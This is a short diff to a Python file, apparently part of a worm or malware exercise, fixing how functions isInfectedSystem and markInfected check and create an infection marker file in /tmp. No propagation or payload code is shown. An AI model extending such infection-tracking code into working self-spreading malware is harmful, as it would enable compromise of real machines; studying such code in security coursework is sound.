@@ -28,7 +28,7 @@ def isInfectedSystem():
 	# you created when you marked the system
 	# as infected). 
 
-	return os.path.exists(file_path)
+	return os.path.exists(INFECTED_MARKER_FILE)
 
 #################################################################
 # Marks the system as infected
@@ -40,7 +40,7 @@ def markInfected():
 	# in directory /tmp/
 	
 	# get wr3ck3d
-	with open('INFECTED_MARKER_FILE', 'w') as f:
+	with open(INFECTED_MARKER_FILE, 'w') as f:
 		pass	
 
 ###############################################################
